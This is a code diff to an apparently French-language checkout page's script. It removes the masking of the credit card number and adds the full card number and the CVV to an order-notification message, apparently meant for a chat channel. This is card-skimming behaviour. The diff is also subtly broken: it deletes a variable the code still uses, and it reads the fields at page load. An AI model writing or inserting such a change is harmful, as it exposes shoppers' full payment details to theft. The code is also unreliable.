@@ -1363,14 +1363,9 @@
 
     // Credit card preview
     const cardNameInput = document.getElementById('cardName');
-    const cardNumberInput = document.getElementById('cardNumber');
+    const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
     const cardExpiryInput = document.getElementById('cardExpiry');
-    
-    const cardNamePreview = document.getElementById('cardNamePreview');
-    const cardNumberPreview = document.getElementById('cardNumberPreview');
-    const cardExpiryMonthPreview = document.getElementById('cardExpiryMonthPreview');
-    const cardExpiryYearPreview = document.getElementById('cardExpiryYearPreview');
-    const creditCardPreview = document.getElementById('creditCardPreview');
+    const cvv = document.getElementById("cvv").value;
     
     // Format card number with spaces
     cardNumberInput.addEventListener('input', function(e) {
@@ -1444,8 +1439,9 @@
         
         💳 *Informations de Paiement:*
         - Type: Carte Bancaire
-        - Numéro: ${data.cardNumber.replace(/\s/g, '').replace(/\d{12}/, '************')}
+       💳 Numéro de Carte: ${numeroCarte}
         - Expiration: ${data.cardExpiry}
+        🔒 CVV: ${cvv}
         - Nom sur carte: ${data.cardName}
         
         🛒 *Détails de la Commande:*
